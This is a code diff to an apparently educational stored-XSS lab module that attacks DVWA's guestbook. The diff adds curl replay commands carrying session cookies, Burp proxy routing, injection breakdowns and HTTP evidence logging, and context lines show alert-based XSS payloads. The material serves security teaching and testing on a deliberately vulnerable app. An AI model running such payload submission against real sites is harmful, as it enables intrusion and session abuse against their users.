@@ -3,6 +3,8 @@ Stored XSS module for XSS Lab Tool.
 Demonstrates and teaches stored (persistent) XSS attacks.
 """
 
+import shlex
+import textwrap
 from typing import Optional
 from ..explanations.text_blocks import XSSExplanations
 
@@ -35,6 +37,7 @@ class StoredXSSModule:
             ("<img src=x onerror=alert('XSS')>", "Image error handler"),
             ("<svg/onload=alert('XSS')>", "SVG onload event"),
         ]
+        self._injection_details_logged = False
 
     def run_interactive(self, interactive: bool = True) -> bool:
         """
@@ -82,6 +85,10 @@ class StoredXSSModule:
             return False
 
         self.logger.educational("✓ Successfully accessed guestbook page")
+
+        if not self._injection_details_logged:
+            self._log_injection_breakdown()
+            self._injection_details_logged = True
 
         # Step 3: Explain the attack flow
         self.logger.educational(self.explanations.STORED_XSS_IMPACT)
@@ -137,15 +144,20 @@ class StoredXSSModule:
         # Get CSRF token for the form
         csrf_token = self.auth.get_csrf_token(url)
 
-        # Prepare form data
+        # Prepare form data and append user-agent marker for attribution
+        ua_string = self.http.get_user_agent()
+        annotated_payload = f"{payload}\n<!-- UA: {ua_string} -->"
         form_data = {
             'txtName': 'XSS Test User',
-            'mtxMessage': payload,
+            'mtxMessage': annotated_payload,
             'btnSign': 'Sign Guestbook'
         }
 
         if csrf_token:
             form_data['user_token'] = csrf_token
+
+        self.logger.educational(f"User-Agent recorded with this entry: {ua_string}")
+        self._log_curl_examples("POST", url, data=form_data, include_cookies=True)
 
         # Submit the payload
         response = self.http.post(url, data=form_data)
@@ -164,6 +176,8 @@ class StoredXSSModule:
         self.logger.educational("\n→ Retrieving guestbook to check if payload persists...")
 
         response = self.http.get(url)
+
+        self._log_curl_examples("GET", url, include_cookies=True)
 
         if not response:
             self.logger.explain_failure(
@@ -192,6 +206,7 @@ class StoredXSSModule:
                 f"  - Redirect users to phishing pages\n"
                 f"  - Modify page content for all users"
             )
+            self._log_http_evidence(response, payload, "stored entry rendered in body")
             return True
         else:
             # Check if it's encoded
@@ -205,6 +220,7 @@ class StoredXSSModule:
                     "preserving the data. The current DVWA security level is doing output encoding.",
                     f"Try a different payload or lower security level" if attempt_num < len(self.payloads) else None
                 )
+                self._log_http_evidence(response, payload, "payload encoded before rendering")
             else:
                 self.logger.explain_failure(
                     f"Payload {attempt_num} may have been filtered",
@@ -214,8 +230,109 @@ class StoredXSSModule:
                     "  - Higher security level prevented storage",
                     f"Try alternative payload" if attempt_num < len(self.payloads) else None
                 )
+                self._log_http_evidence(response, payload, "payload missing from rendered output")
 
         return False
+
+    def _log_injection_breakdown(self):
+        """Explain exactly where the stored payload lands."""
+        url = self.config.get_dvwa_url(self.xss_stored_path)
+        breakdown = [
+            f"Target endpoint: {url}",
+            "HTTP method: POST to store data, GET to trigger victims.",
+            "Request fields: txtName (attacker alias), mtxMessage (payload).",
+            "Server writes message to database, then echoes in HTML body for every visitor.",
+            "Headers remain untouched; the stored content lives inside the guestbook table rows.",
+        ]
+        self.logger.educational("Injection breakdown:\n" + "\n".join(f"  - {line}" for line in breakdown))
+
+    def _log_curl_examples(
+        self,
+        method: str,
+        url: str,
+        params: Optional[dict] = None,
+        data: Optional[dict] = None,
+        include_cookies: bool = False,
+    ):
+        """Show curl commands (direct + Burp) for POST/GET requests."""
+        cookie_fragment = self._build_cookie_fragment() if include_cookies else None
+        direct = self._build_curl_command(method, url, params, data, cookie_fragment, use_proxy=False)
+        burp = self._build_curl_command(method, url, params, data, cookie_fragment, use_proxy=True)
+        self.logger.educational(
+            "Replay with curl (add this to Burp if desired):\n"
+            f"  direct : {direct}\n"
+            f"  via Burp: {burp}\n"
+        )
+
+    def _build_curl_command(
+        self,
+        method: str,
+        url: str,
+        params: Optional[dict],
+        data: Optional[dict],
+        cookie_fragment: Optional[str],
+        use_proxy: bool,
+    ) -> str:
+        """Construct a curl command string."""
+        parts = ["curl", "-sS"]
+        if use_proxy:
+            parts.extend(["--proxy", "http://127.0.0.1:8080"])
+
+        if cookie_fragment:
+            parts.extend(["--cookie", shlex.quote(cookie_fragment)])
+
+        if method.upper() == "GET":
+            parts.extend(["-G", shlex.quote(url)])
+            for key, value in (params or {}).items():
+                safe_value = str(value).replace("\n", "\\n")
+                parts.extend(["--data-urlencode", shlex.quote(f"{key}={safe_value}")])
+        else:
+            parts.extend(["-X", method.upper(), shlex.quote(url)])
+            for key, value in (data or {}).items():
+                safe_value = str(value).replace("\n", "\\n")
+                parts.extend(["-d", shlex.quote(f"{key}={safe_value}")])
+
+        return " ".join(parts)
+
+    def _build_cookie_fragment(self) -> str:
+        """Return a cookie string (or placeholder) for curl reproduction."""
+        cookie_pairs = []
+        for name in ['PHPSESSID', 'security']:
+            value = self.http.get_cookie(name)
+            if value:
+                cookie_pairs.append(f"{name}={value}")
+        if not cookie_pairs:
+            cookie_pairs.append("PHPSESSID=<copy-from-browser>")
+        return "; ".join(cookie_pairs)
+
+    def _log_http_evidence(self, response, payload: str, note: str):
+        """Show HTTP evidence that the stored payload rendered."""
+        snippet, hint = self._extract_payload_snippet(response.text, payload)
+        interesting_headers = []
+        for header in ["Content-Type", "Server", "Date"]:
+            if header in response.headers:
+                interesting_headers.append(f"{header}: {response.headers[header]}")
+        header_text = "\n".join(f"  {line}" for line in interesting_headers) or "  (no headers sampled)"
+        body_text = textwrap.indent(snippet, "    ")
+
+        self.logger.educational(
+            f"HTTP evidence ({note}):\n"
+            f"  Status: {response.status_code}\n"
+            f"{header_text}\n"
+            f"  Body excerpt ({hint}):\n{body_text}\n"
+        )
+
+    def _extract_payload_snippet(self, body: str, payload: str, radius: int = 160):
+        """Return a snippet that highlights the payload."""
+        index = body.find(payload)
+        if index == -1:
+            snippet = body[:radius] or "(empty response body)"
+            return snippet.strip(), "payload not present; showing leading bytes"
+
+        start = max(index - radius // 2, 0)
+        end = min(index + len(payload) + radius // 2, len(body))
+        snippet = body[start:end].replace(payload, f"<<PAYLOAD>>{payload}<<PAYLOAD>>")
+        return snippet.strip(), "payload highlighted with <<PAYLOAD>> markers"
 
     def _get_user_approval(self, prompt: str) -> bool:
         """
